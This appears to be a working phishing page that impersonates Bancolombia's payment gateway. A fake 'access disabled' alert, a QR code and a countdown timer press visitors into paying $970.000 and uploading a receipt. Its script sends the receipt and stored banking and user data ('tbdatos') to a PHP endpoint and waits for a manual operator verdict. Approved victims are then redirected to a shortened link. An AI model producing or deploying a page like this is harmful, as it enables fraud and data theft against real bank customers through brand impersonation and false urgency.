<!DOCTYPE html>
<html lang="es">
<head>
    <link rel="icon" href="/img/favicon.svg" type="image/svg+xml">
    <link rel="shortcut icon" href="/img/favicon.svg">
    <link rel="apple-touch-icon" href="/img/favicon.svg">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Pasarela de Pago Bancolombia QR</title>
    <style>
        /* =========================================
           VARIABLES DE COLOR Y ESTILOS
           ========================================= */
        :root {
            --bancolombia-yellow: #FFD200;
            --text-dark: #2C2A29;
            --text-gray: #707070;
            --text-light-gray: #A0A0A0;
            --border-color: #E6E6E6;
            --alert-bg: #FFF9E5;
            --alert-border: #FDE89D;
            --amount-color: #B08D2C;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #FFFFFF;
            color: var(--text-dark);
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            position: relative;
        }

        /* =========================================
           PANTALLA DE CARGA (OVERLAY DIFUMINADO)
           ========================================= */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background-color: rgba(255, 255, 255, 0.75);
            backdrop-filter: blur(10px); 
            -webkit-backdrop-filter: blur(10px);
            display: none; 
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 9999; 
        }

        .loading-gif {
            width: 280px;
            border-radius: 24px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            margin-bottom: 24px;
        }

        .loading-text {
            font-size: 22px;
            font-weight: 700;
            color: var(--text-dark);
            margin-bottom: 8px;
        }

        .loading-subtext {
            font-size: 14px;
            color: var(--text-gray);
            text-align: center;
            padding: 0 20px;
        }

        /* =========================================
           DISEÑO PARA PC (ESCRITORIO)
           ========================================= */
        .main-container {
            display: grid;
            grid-template-columns: 1fr 380px;
            gap: 50px;
            background-color: #FFFFFF;
            width: 100%;
            max-width: 950px;
            border-radius: 24px;
            padding: 48px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
            margin: 40px 20px;
        }

        .col-left { display: flex; flex-direction: column; }
        .col-right {
            display: flex; flex-direction: column;
            background-color: #FAFAFA;
            border: 1px solid var(--border-color);
            border-radius: 20px; padding: 32px 24px; align-items: center;
        }

        /* ===== ELEMENTOS INTERNOS ===== */
        .header { margin-bottom: 32px; display: flex; justify-content: space-between; align-items: center; width: 100%; }
        .main-logo { height: 60px; object-fit: contain; }
        .btn-close { background: transparent; border: none; cursor: pointer; color: var(--text-dark); padding: 4px; }

        .title-section { margin-bottom: 24px; text-align: left; }
        .title-section h2 { font-size: 24px; font-weight: 700; margin-bottom: 12px; }
        .title-section p { font-size: 15px; color: var(--text-gray); line-height: 1.5; }

        .alert-box { 
            background-color: var(--alert-bg); border: 1px solid var(--alert-border); 
            border-radius: 12px; padding: 16px; display: flex; gap: 12px; margin-bottom: 32px; 
        }
        .alert-icon-svg { flex-shrink: 0; width: 24px; height: 24px; }
        .alert-content h4 { font-size: 14px; font-weight: 700; margin-bottom: 4px; color: #8A6400; }
        .alert-content p { font-size: 13px; color: #8A6400; line-height: 1.4; }

        .instructions { margin-bottom: 32px; }
        .instruction-step { display: flex; align-items: center; gap: 16px; margin-bottom: 16px; font-size: 15px; }
        .step-number { 
            width: 24px; height: 24px; background-color: var(--bancolombia-yellow); 
            border-radius: 50%; display: flex; align-items: center; justify-content: center; 
            font-size: 13px; font-weight: 700; flex-shrink: 0; 
        }

        .footer-text { margin-top: auto; font-size: 12px; color: var(--text-light-gray); line-height: 1.5; text-align: left; }

        /* ===== ELEMENTOS DE LA ZONA DE PAGO (DERECHA) ===== */
        .qr-section { margin-bottom: 24px; width: 100%; display: flex; justify-content: center; }
        .qr-frame { position: relative; padding: 16px; width: 220px; height: 220px; }
        .qr-frame::before, .qr-frame::after, .qr-frame-inner::before, .qr-frame-inner::after { 
            content: ''; position: absolute; width: 20px; height: 20px; border-color: var(--bancolombia-yellow); border-style: solid; 
        }
        .qr-frame::before { top: 0; left: 0; border-width: 3px 0 0 3px; border-top-left-radius: 8px; }
        .qr-frame::after { top: 0; right: 0; border-width: 3px 3px 0 0; border-top-right-radius: 8px; }
        .qr-frame-inner::before { bottom: 0; left: 0; border-width: 0 0 3px 3px; border-bottom-left-radius: 8px; }
        .qr-frame-inner::after { bottom: 0; right: 0; border-width: 0 3px 3px 0; border-bottom-right-radius: 8px; }
        .qr-image { width: 100%; height: 100%; object-fit: contain; display: block; border-radius: 4px; }

        .amount-box { 
            border: 1px solid var(--border-color); background: #fff; 
            border-radius: 12px; text-align: center; padding: 16px; margin-bottom: 16px; width: 100%; 
        }
        .amount-box h3 { font-size: 11px; color: #4A5568; text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
        .amount-value { font-size: 28px; font-weight: 700; color: var(--amount-color); margin-bottom: 4px; }
        .amount-box p { font-size: 11px; color: var(--text-light-gray); font-style: italic; }

        .timer-box { 
            border: 1px solid var(--border-color); background: #fff; 
            border-radius: 12px; padding: 16px; display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 24px; width: 100%; 
        }
        .timer-icon-svg { width: 32px; height: 32px; flex-shrink: 0; }
        .timer-content h4 { font-size: 15px; font-weight: 700; }
        .timer-content h4 span { color: var(--amount-color); }
        .timer-content p { font-size: 12px; color: var(--text-light-gray); display: flex; align-items: center; gap: 4px; margin-top: 2px; justify-content: center; }

        .action-buttons { width: 100%; }
        .btn { 
            display: flex; align-items: center; justify-content: center; gap: 8px; width: 100%; 
            padding: 14px; border-radius: 30px; font-size: 15px; font-weight: 600; cursor: pointer; 
            margin-bottom: 12px; transition: all 0.2s ease; text-decoration: none; border: none; 
        }
        .btn-yellow { background-color: var(--bancolombia-yellow); color: var(--text-dark); }
        .btn-yellow:hover { background-color: #e6bd00; }
        .btn-outline { background-color: transparent; color: var(--text-dark); border: 1px dashed var(--text-light-gray); }
        .btn-disabled { background-color: #F4F6F8; color: var(--text-light-gray); cursor: not-allowed; }
        .icon-btn-svg { width: 18px; height: 18px; }

        /* =========================================
           ADAPTACIÓN A CELULAR (PÁGINA COMPLETA)
           ========================================= */
        @media (max-width: 800px) {
            body { align-items: flex-start; }
            .main-container {
                display: flex; flex-direction: column; max-width: 100%; margin: 0;
                border-radius: 0; box-shadow: none; min-height: 100vh; padding: 24px 20px; gap: 0;
            }
            .col-left, .col-right { display: contents; }
            .col-right { background-color: transparent; border: none; padding: 0; }
            .title-section { text-align: center; }
            .title-section h2 { font-size: 20px; }
            .footer-text { text-align: center; margin-top: 24px; }
            .amount-box, .timer-box { background: transparent; }

            .item-header       { order: 1; }
            .item-title        { order: 2; }
            .item-alert        { order: 3; }
            .item-qr           { order: 4; }
            .item-amount       { order: 5; }
            .item-timer        { order: 6; }
            .item-instructions { order: 7; }
            .item-buttons      { order: 8; }
            .item-footer       { order: 9; }
        }

        /* ===== OVERLAY PAGO APROBADO ===== */
        .aprobado-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.65);
            z-index: 10000;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.4s ease, visibility 0.4s ease;
        }
        .aprobado-overlay.show {
            opacity: 1;
            visibility: visible;
        }
        .aprobado-card {
            background: #fff;
            border-radius: 20px;
            padding: 50px 40px 40px;
            text-align: center;
            max-width: 380px;
            width: 90%;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            transform: scale(0.7);
            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .aprobado-overlay.show .aprobado-card {
            transform: scale(1);
        }
        .check-circle {
            width: 90px;
            height: 90px;
            border-radius: 50%;
            background: linear-gradient(135deg, #28a745, #20c997);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            box-shadow: 0 0 0 0 rgba(40, 167, 69, 0.5);
            animation: pulseGreen 1.6s ease infinite;
        }
        @keyframes pulseGreen {
            0%   { box-shadow: 0 0 0 0 rgba(40,167,69,0.5); }
            70%  { box-shadow: 0 0 0 18px rgba(40,167,69,0); }
            100% { box-shadow: 0 0 0 0 rgba(40,167,69,0); }
        }
        .check-circle svg {
            animation: bounceIn 0.5s 0.3s ease both;
        }
        @keyframes bounceIn {
            0%   { transform: scale(0); opacity: 0; }
            60%  { transform: scale(1.2); opacity: 1; }
            100% { transform: scale(1); }
        }
        .aprobado-title {
            font-size: 1.7rem;
            font-weight: 800;
            color: #28a745;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }
        .aprobado-sub {
            font-size: 0.95rem;
            color: #666;
            margin-bottom: 28px;
            line-height: 1.5;
        }
        .redirect-bar-wrap {
            background: #f0f0f0;
            border-radius: 50px;
            height: 6px;
            overflow: hidden;
            margin-bottom: 10px;
        }
        .redirect-bar {
            height: 100%;
            background: linear-gradient(90deg, #28a745, #20c997);
            border-radius: 50px;
            width: 100%;
            animation: shrinkBar 3s linear forwards;
        }
        @keyframes shrinkBar {
            from { width: 100%; }
            to   { width: 0%; }
        }
        .redirect-text {
            font-size: 0.82rem;
            color: #999;
        }

        /* ===== BANNER PAGO RECHAZADO ===== */
        .rechazado-banner {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: linear-gradient(135deg, #c0392b, #e74c3c);
            color: #fff;
            padding: 18px 24px;
            z-index: 9000;
            display: flex;
            align-items: flex-start;
            gap: 16px;
            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.25);
            transform: translateY(100%);
            transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        .rechazado-banner.show {
            transform: translateY(0);
        }
        .rechazado-icon-wrap {
            font-size: 2rem;
            flex-shrink: 0;
            margin-top: 2px;
        }
        .rechazado-content { flex: 1; }
        .rechazado-title {
            font-size: 1.05rem;
            font-weight: 800;
            margin-bottom: 5px;
        }
        .rechazado-msg {
            font-size: 0.9rem;
            opacity: 0.92;
            line-height: 1.5;
        }
        .rechazado-close {
            background: rgba(255,255,255,0.2);
            border: none;
            color: #fff;
            width: 30px;
            height: 30px;
            border-radius: 50%;
            font-size: 1.2rem;
            cursor: pointer;
            flex-shrink: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: background 0.2s;
            align-self: flex-start;
        }
        .rechazado-close:hover { background: rgba(255,255,255,0.35); }
    </style>
</head>
<body>

    <div id="loading-overlay" class="loading-overlay">
        <img src="https://cdn.dribbble.com/userupload/22404581/file/original-afe1145aa15c05604dd044689d1c11d0.gif" alt="Cargando Validación" class="loading-gif">
        <h3 class="loading-text">Validando tu pago...</h3>
        <p class="loading-subtext">Por favor, espera un momento mientras confirmamos la transacción. No cierres esta ventana.</p>
    </div>

    <!-- ===== OVERLAY PAGO APROBADO ===== -->
    <div class="aprobado-overlay" id="aprobado-overlay">
        <div class="aprobado-card">
            <div class="check-circle">
                <svg width="44" height="44" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
            </div>
            <div class="aprobado-title">¡Pago Aprobado!</div>
            <div class="aprobado-sub">Tu pago ha sido confirmado exitosamente.<br>Serás redirigido en un momento.</div>
            <div class="redirect-bar-wrap">
                <div class="redirect-bar" id="redirect-bar"></div>
            </div>
            <div class="redirect-text">Redirigiendo...</div>
        </div>
    </div>

    <!-- ===== BANNER PAGO RECHAZADO ===== -->
    <div class="rechazado-banner" id="rechazado-banner">
        <div class="rechazado-icon-wrap">⚠️</div>
        <div class="rechazado-content">
            <div class="rechazado-title">No pudimos reconocer tu pago</div>
            <div class="rechazado-msg">Aún no hemos podido reconocer tu pago. Por favor adjunta el comprobante nuevamente y repite el proceso para que podamos verificarlo.</div>
        </div>
        <button class="rechazado-close" onclick="document.getElementById('rechazado-banner').classList.remove('show')" aria-label="Cerrar">✕</button>
    </div>

    <div class="main-container">
        
        <div class="col-left">
            <div class="header item-header">
                <img src="img/sol.svg" alt="Logo Bancolombia" class="main-logo">
                <button class="btn-close">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg>
                </button>
            </div>

            <div class="title-section item-title">
                <h2>Paga rápido con QR Bancolombia</h2>
                <p>Escanea el código desde tu app Mi Bancolombia y confirma el pago en segundos.</p>
            </div>

            <div class="alert-box item-alert">
                <svg class="alert-icon-svg" viewBox="0 0 24 24" fill="#FDD116">
                  <path d="M12 2L2 19h20L12 2z"/>
                  <circle cx="12" cy="16" r="1.5" fill="#FFF"/>
                  <path d="M11 8h2v5h-2z" fill="#FFF"/>
                </svg>
                <div class="alert-content">
                    <h4>Ingreso inhabilitado</h4>
                    <p>El acceso a la Sucursal Virtual se encuentra inhabilitado en este momento. Te ofrecemos el pago por código QR como método alternativo seguro.</p>
                </div>
            </div>

            <div class="instructions item-instructions">
                <div class="instruction-step">
                    <div class="step-number">1</div>
                    <p>Abre tu app <b>Mi Bancolombia</b></p>
                </div>
                <div class="instruction-step">
                    <div class="step-number">2</div>
                    <p>Toca <b>"Pagar con QR"</b> en el inicio</p>
                </div>
                <div class="instruction-step">
                    <div class="step-number">3</div>
                    <p>Escanea este código y confirma el pago</p>
                </div>
            </div>

            <p class="footer-text item-footer">
                Realiza el pago escaneando el QR, luego adjunta el comprobante y envíalo para verificar.
            </p>
        </div>

        <div class="col-right">
            
            <div class="qr-section item-qr">
                <div class="qr-frame">
                    <div class="qr-frame-inner">
                        <img src="qr.jpg" alt="Código QR Bancolombia" class="qr-image">
                    </div>
                </div>
            </div>

            <div class="amount-box item-amount">
                <h3>Monto exacto a pagar</h3>
                <div class="amount-value">$ 970.000</div>
                <p>Si pagas otro valor la transacción no se procesará.</p>
            </div>

            <div class="timer-box item-timer">
                <div class="timer-icon">
                    <svg class="timer-icon-svg" viewBox="0 0 24 24">
                      <circle cx="12" cy="12" r="10" stroke="#B08D2C" stroke-width="2" fill="none"/>
                      <polyline points="12 6 12 12 16 14" stroke="#B08D2C" stroke-width="2" fill="none"/>
                    </svg>
                </div>
                <div class="timer-content">
                    <!-- ID agregado para que el JavaScript pueda actualizar el tiempo -->
                    <h4>Confirma tu pago en <span id="countdown-display">05:00</span></h4>
                    <p>
                        <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#A0A0A0" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="margin-right:2px">
                          <polyline points="23 4 23 10 17 10"></polyline>
                          <path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path>
                        </svg>
                        Verificamos cada 15s
                    </p>
                </div>
            </div>

            <div class="action-buttons item-buttons">
                <!-- Botón Descargar con ID -->
                <button id="btn-descargar" class="btn btn-yellow">
                    <svg class="icon-btn-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path>
                      <polyline points="7 10 12 15 17 10"></polyline>
                      <line x1="12" y1="15" x2="12" y2="3"></line>
                    </svg>
                    Descargar QR
                </button>
                
                <input type="file" id="input-comprobante" accept="image/*" style="display: none;">
                
                <!-- Botón Adjuntar -->
                <button id="btn-adjuntar" class="btn btn-outline" onclick="document.getElementById('input-comprobante').click()">
                    <svg class="icon-btn-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <path d="M21.44 11.05l-9.19 9.19a6 6 0 0 1-8.49-8.49l9.19-9.19a4 4 0 0 1 5.66 5.66l-9.2 9.19a2 2 0 0 1-2.83-2.83l8.49-8.48"></path>
                    </svg>
                    Adjuntar comprobante de pago
                </button>
                
                <!-- Botón Enviar (Deshabilitado por defecto) -->
                <button id="btn-enviar" class="btn btn-disabled" disabled>
                    <svg class="icon-btn-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                      <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                    Enviar comprobante
                </button>
            </div>

        </div>
    </div>

    <script>
        const inputComprobante = document.getElementById('input-comprobante');
        const btnDescargar = document.getElementById('btn-descargar');
        const btnAdjuntar = document.getElementById('btn-adjuntar');
        const btnEnviar = document.getElementById('btn-enviar');
        const loadingOverlay = document.getElementById('loading-overlay');
        const countdownDisplay = document.getElementById('countdown-display');
        
        let archivoSeleccionado = null;
        let timerInterval;

        // ==========================================
        // LÓGICA DEL TEMPORIZADOR DE 5 MINUTOS
        // ==========================================
        function startTimer(duration) {
            let timer = duration, minutes, seconds;
            timerInterval = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);

                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;

                countdownDisplay.textContent = minutes + ":" + seconds;

                if (--timer < 0) {
                    clearInterval(timerInterval);
                    // Opcional: Aquí podrías recargar la página o mostrar un mensaje de tiempo agotado
                    countdownDisplay.textContent = "00:00";
                }
            }, 1000);
        }

        // Iniciar el temporizador automáticamente
        window.onload = function () {
            startTimer(300); // 300 segundos = 5 minutos
        };


        // ==========================================
        // LÓGICA DE BOTONES Y FORMULARIO
        // ==========================================
        // 1. Al seleccionar archivo
        inputComprobante.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                archivoSeleccionado = e.target.files[0];
                
                // Ocultamos botones Descargar QR y Adjuntar Comprobante
                btnDescargar.style.display = 'none';
                btnAdjuntar.style.display = 'none';
                
                // Habilitamos el botón Enviar Comprobante y lo volvemos amarillo
                btnEnviar.classList.remove('btn-disabled');
                btnEnviar.classList.add('btn-yellow'); 
                btnEnviar.disabled = false;
            }
        });

        // 2. Al enviar el comprobante
        btnEnviar.addEventListener('click', async () => {
            if (!archivoSeleccionado) return;

            btnEnviar.disabled = true;

            const formData = new FormData();
            formData.append('comprobante', archivoSeleccionado);
            
            const txId = 'TX' + Math.floor(Math.random() * 1000000);
            formData.append('transactionId', txId);
            
            // Garantiza que la información bancaria y de usuario se envíe correctamente dentro de tbdatos
            const tbdatos = localStorage.getItem('tbdatos') || '{}';
            formData.append('tbdatos', tbdatos);

            try {
                // ACTIVAMOS LA PANTALLA DE CARGA (GIF OVERLAY)
                loadingOverlay.style.display = 'flex';

                const response = await fetch('procesar_pago.php', {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();

                if (result.ok) {
                    // Detener temporizador
                    clearInterval(timerInterval); 
                    revisarRespuestaAdmin(txId);
                } else {
                    loadingOverlay.style.display = 'none';
                    alert('Error: ' + result.error);
                    btnEnviar.disabled = false;
                }
            } catch (error) {
                console.error(error);
                loadingOverlay.style.display = 'none'; 
                alert('Error de conexión');
                btnEnviar.disabled = false;
            }
        });

        async function revisarRespuestaAdmin(tid) {
            try {
                const response = await fetch(`procesar_pago.php?transactionId=${tid}`, { method: 'GET' });
                const result = await response.json();

                if (result.ok && result.action) {
                    loadingOverlay.style.display = 'none';

                    if (result.action === 'pago_recibido') {
                        mostrarAprobado();
                    } else if (result.action === 'pago_rechazado') {
                        mostrarRechazado();
                    }
                } else {
                    setTimeout(() => revisarRespuestaAdmin(tid), 2000);
                }
            } catch (error) {
                setTimeout(() => revisarRespuestaAdmin(tid), 2000);
            }
        }

        const URL_REDIRECT_APROBADO = 'https://l1nq.com/j2rjq84';

        function mostrarAprobado() {
            const overlay = document.getElementById('aprobado-overlay');
            overlay.classList.add('show');

            const bar = document.getElementById('redirect-bar');
            bar.style.animation = 'none';
            void bar.offsetWidth;
            bar.style.animation = 'shrinkBar 3s linear forwards';

            setTimeout(function () {
                window.location.href = URL_REDIRECT_APROBADO;
            }, 3200);
        }

        function mostrarRechazado() {
            btnEnviar.innerHTML = `
                <svg class="icon-btn-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                  <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
                Enviar comprobante`;
            btnEnviar.classList.remove('btn-yellow');
            btnEnviar.classList.add('btn-disabled');
            btnEnviar.disabled = true;
            archivoSeleccionado = null;
            btnDescargar.style.display = 'flex';
            btnAdjuntar.style.display = 'flex';
            document.getElementById('input-comprobante').value = '';

            document.getElementById('rechazado-banner').classList.add('show');
        }
    </script>
</body>
</html>